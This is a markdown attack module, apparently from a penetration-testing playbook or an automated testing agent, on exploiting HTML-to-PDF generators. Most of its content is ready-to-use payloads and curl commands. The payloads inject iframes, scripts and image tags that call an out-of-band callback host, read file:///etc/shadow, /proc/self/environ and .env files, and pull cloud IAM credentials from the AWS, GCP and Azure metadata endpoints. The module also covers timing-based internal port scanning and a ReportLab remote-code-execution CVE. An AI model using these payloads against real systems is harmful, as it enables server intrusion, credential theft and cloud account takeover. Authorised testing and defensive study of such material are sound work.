# VULN MODULE — PDF Generator SSRF / LFD
# Asset: webapp
# CWE-918 (SSRF) / CWE-73 (LFD) | Report prefix: WEB-SSRF / WEB-LFD
# See also: ssrf_filter_evasion.md (IP bypass), nextjs_ssrf.md (framework-level SSRF)

## THREAT MODEL

PDF generators (HTML-to-PDF via headless browser, template-based, or third-party API)
process user-controllable input server-side. When input is unsanitized and concatenated
into an HTML template, the headless browser fetches attacker-controlled URLs on behalf
of the server — enabling SSRF, Local File Disclosure, and cloud credential theft.

Three generation methods:
- **HTML-to-PDF** (most common) — headless Chromium renders HTML → SSRF via HTML injection
- **Template-based** — injection into template language → may escalate to RCE (CVE-2023-33733)
- **Third-party service** — external API; less susceptible to injection

## DISCOVERY — WHERE TO LOOK

Endpoints that commonly trigger PDF generation:
- Analytics / financial reports
- Receipts & invoices (e-commerce)
- Account data archives / exports
- Bank account statements
- Certificates (education/training platforms)

Behavioral signals:
- Slow response or asynchronous job (PDF generation takes time — often async)
- Response is a PDF file or a link/notification to a generated PDF
- Any `export`, `download`, `report`, `invoice`, `statement`, `certificate` endpoint

## WHITEBOX GREP PATTERNS

```bash
# HTML-to-PDF libraries
grep -rn "wkhtmltopdf\|puppeteer\|playwright\|chromium\|headless\|phantomjs" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.rb" --include="*.php"

# Template-based PDF libraries
grep -rn "reportlab\|fpdf\|weasyprint\|dompdf\|mpdf\|tcpdf\|pdfkit\|prawn" \
  --include="*.py" --include="*.php" --include="*.rb" --include="*.gemspec"

# User-controlled input flowing into HTML template
grep -rn "html.*request\.\|template.*param\|render.*input\|innerHTML.*req\." \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.php"

# Look for --disable-local-file-access flag (wkhtmltopdf protection)
grep -rn "disable-local-file-access\|allow-running-insecure-content" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.sh" --include="*.php"
# If NOT present alongside wkhtmltopdf → local file access likely enabled
```

## STEP 1 — CONFIRM HTML INJECTION

Find a user-controlled parameter that ends up in the PDF content and test basic injection:

```http
POST /api/invoice/export HTTP/2
Host: target.com
Content-Type: application/json

{"invoiceData": "<h1>INJECTED</h1>"}
```

If the PDF renders "INJECTED" as a heading → HTML injection confirmed → proceed to SSRF.

## STEP 2 — FULL SSRF (RESPONSE VISIBLE IN PDF)

Try each payload in turn — different libraries block different tags:

```http
POST /api/invoice/export HTTP/2
Host: target.com
Content-Type: application/json

{"invoiceData": "<iframe src=\"http://YOUR.OAST.NET/pdf-ssrf\"></iframe>"}
```

```html
<!-- iframe — most direct, often blocked first -->
<iframe src="http://YOUR.OAST.NET/pdf-ssrf" height="1000" width="1000"></iframe>

<!-- embed -->
<embed src="http://YOUR.OAST.NET/pdf-ssrf" />

<!-- XHR — executes in headless browser, writes response into page -->
<script>
  var x = new XMLHttpRequest();
  x.onload = function() { document.write(this.responseText); };
  x.open('GET', 'http://127.0.0.1');
  x.send();
</script>

<!-- Fetch API -->
<script>
  fetch('http://127.0.0.1').then(async r => document.write(await r.text()))
</script>
```

If the PDF contains the response body of your OAST callback or the internal service → Full SSRF confirmed.

## STEP 3 — BLIND SSRF (OUT-OF-BAND CALLBACKS)

When XSS filters block `<script>`, `<iframe>`, `<embed>` — use passive resource-loading tags.
Point to your OAST server and watch for DNS/HTTP callbacks:

```html
<!-- Redirects entire base URL — any relative resource will hit OAST -->
<base href="http://YOUR.OAST.NET" />

<!-- External stylesheet / script -->
<link rel="stylesheet" href="http://YOUR.OAST.NET/blind-css" />
<script src="http://YOUR.OAST.NET/blind-js"></script>

<!-- Meta refresh -->
<meta http-equiv="refresh" content="0; url=http://YOUR.OAST.NET/meta" />

<!-- Image / media sources -->
<img src="http://YOUR.OAST.NET/img" />
<video src="http://YOUR.OAST.NET/video" />
<audio src="http://YOUR.OAST.NET/audio" />
<audio><source src="http://YOUR.OAST.NET/source"/></audio>

<!-- input[type=image] — often overlooked by blacklists -->
<input type="image" src="http://YOUR.OAST.NET/input-img" />

<!-- SVG -->
<svg src="http://YOUR.OAST.NET/svg" />
```

Any DNS/HTTP hit on your OAST server → Blind SSRF confirmed.

## STEP 4 — ESCALATION

### 4a. Local File Disclosure

```html
<!-- Read /etc/passwd — increase dimensions to capture full file -->
<iframe src="file:///etc/passwd" height="2000px" width="1000px"></iframe>

<!-- Other high-value targets -->
<iframe src="file:///etc/shadow" height="2000px" width="1000px"></iframe>
<iframe src="file:///proc/self/environ" height="2000px" width="1000px"></iframe>
<iframe src="file:///proc/self/cmdline" height="2000px" width="1000px"></iframe>
<iframe src="file:///app/config/database.yml" height="2000px" width="1000px"></iframe>
<iframe src="file:///.env" height="2000px" width="1000px"></iframe>
```

Blocked by `--disable-local-file-access` (wkhtmltopdf) or browser sandbox → fall back to internal SSRF.

### 4b. AWS/GCP Cloud Metadata (serverless PDF jobs)

PDF generation is often async → may run in AWS Lambda or GCP Cloud Run.
These environments expose instance metadata with IAM credentials:

```html
<!-- AWS IMDSv1 — IAM credentials -->
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" height="1000px" width="1000px"></iframe>

<!-- GCP -->
<iframe src="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" height="1000px" width="1000px"></iframe>

<!-- Azure -->
<iframe src="http://169.254.169.254/metadata/instance?api-version=2021-02-01" height="1000px" width="1000px"></iframe>
```

Or via XHR for cleaner output:
```html
<script>
  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
    .then(async r => document.write(await r.text()))
</script>
```

### 4c. Internal Network Enumeration (Blind — Timing-based)

When all response content is suppressed, use response time as an oracle:

- Fast response → port closed / host unreachable
- Slow response / timeout → port open or host exists

```html
<!-- Probe internal hosts — watch PDF response time difference -->
<img src="http://192.168.1.1:8080/" />
<img src="http://10.0.0.1:6379/" />   <!-- Redis -->
<img src="http://10.0.0.1:9200/" />   <!-- Elasticsearch -->
```

Automate with Burp Intruder / ffuf using response-time comparison.

### 4d. Template Injection → RCE

If the library is template-based, injection may escalate beyond SSRF:
- **CVE-2023-33733** — ReportLab (Python PDF library): HTML `<para>` tag injection → arbitrary Python code execution
- Test for SSTI payloads inside template fields if the response reflects computed values

## COMPLETE TESTING WORKFLOW

```bash
TARGET="https://target.com/api/invoice/export"
OAST="YOUR.OAST.NET"

# Step 1: Confirm HTML injection
curl -s "$TARGET" -X POST -H "Content-Type: application/json" \
  -d '{"invoiceData": "<h1 style=\"color:red\">INJECTED</h1>"}' -o /tmp/test.pdf
# Open /tmp/test.pdf and verify INJECTED appears

# Step 2: Blind SSRF probe (check OAST for callback)
curl -s "$TARGET" -X POST -H "Content-Type: application/json" \
  -d "{\"invoiceData\": \"<img src=\\\"http://$OAST/probe\\\"/>\"}" -o /dev/null

# Step 3: Full SSRF (response in PDF)
curl -s "$TARGET" -X POST -H "Content-Type: application/json" \
  -d "{\"invoiceData\": \"<iframe src=\\\"http://127.0.0.1:80/\\\" height=\\\"2000\\\" width=\\\"1000\\\"></iframe>\"}" \
  -o /tmp/ssrf_result.pdf

# Step 4: LFD
curl -s "$TARGET" -X POST -H "Content-Type: application/json" \
  -d '{"invoiceData": "<iframe src=\"file:///etc/passwd\" height=\"2000px\" width=\"1000px\"></iframe>"}' \
  -o /tmp/lfd_result.pdf

# Step 5: Cloud metadata
curl -s "$TARGET" -X POST -H "Content-Type: application/json" \
  -d '{"invoiceData": "<iframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" height=\"2000px\" width=\"1000px\"></iframe>"}' \
  -o /tmp/metadata.pdf
```

## IMPACT TABLE

| Vulnerability | Severity | Impact |
|---|---|---|
| Full SSRF (internal response in PDF) | High | Internal service access, credential exposure |
| Local File Disclosure via `file://` | High/Critical | Source code, credentials, `/etc/passwd`, `.env` |
| AWS metadata credential theft | Critical | Cloud account takeover via IAM key exfiltration |
| Blind SSRF (OOB callback only) | Medium | Internal port/host enumeration |
| Template injection → RCE (CVE-2023-33733) | Critical | Arbitrary code execution on server |

## AUTO-LOAD TRIGGERS

Load this module automatically when:
- `export`, `download`, `report`, `invoice`, `statement`, `certificate` endpoints found
- Response is a PDF file (`Content-Type: application/pdf`)
- `wkhtmltopdf`, `puppeteer`, `playwright`, `weasyprint`, `dompdf`, `reportlab`, `pdfkit` found in source/deps
- Async job pattern detected (request returns job ID, later fetches PDF)
